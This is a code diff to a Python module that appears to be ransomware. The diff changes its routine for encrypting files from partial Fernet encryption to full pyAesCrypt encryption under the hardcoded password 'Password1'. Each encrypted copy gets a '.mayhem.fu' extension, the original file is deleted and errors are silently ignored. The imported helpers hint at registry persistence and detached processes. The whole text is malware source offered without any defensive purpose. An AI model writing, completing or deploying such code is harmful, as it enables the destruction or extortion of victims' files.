@@ -1,9 +1,8 @@
 import os.path
-
-from cryptography.fernet import Fernet
+import pyAesCrypt
 from Utils.helpers import run_detached_process,setRegistryKey,random_string,get_current_file_path,getRegistryKey
-key = Fernet.generate_key()
-encryptor = Fernet(key)
+key ="Password1"
+bufferSize = 64 * 1024
 
 
 def xor(data, key):
@@ -17,16 +16,9 @@ def encrypt(path, folder, file):
     # //TODO: add doc for this whole thing
     try:
         with open(f'{path}/{folder}/{file}', 'rb') as ToEncrypt:
-            info = ToEncrypt.read()
-            first = info[0:round(len(info) / 8)] # this is mayhem. we just fuck everything
-            second = info[round(len(info) / 8) : round(len(info) / 6)]
-            first = Fernet.encrypt(first)
-            second = Fernet.encrypt(second)
-            info[0:round(len(info) / 8)] = first
-            info[round(len(info) / 8) : round(len(info) / 6)] = second
-            ToEncrypt.truncate()
-            ToEncrypt.write(info)
-        os.rename(f'{path}/{folder}/{file}', f'{path}/{folder}/{file}.mayhem.fu')
+            with open(f'{path}/{folder}/{file}.mayhem.fu','wb') as encryptedFile:
+                pyAesCrypt.encryptStream(ToEncrypt,encryptedFile,key,bufferSize)
+        os.remove(f'{path}/{folder}/{file}')
     except Exception as e:
         pass
     return 0
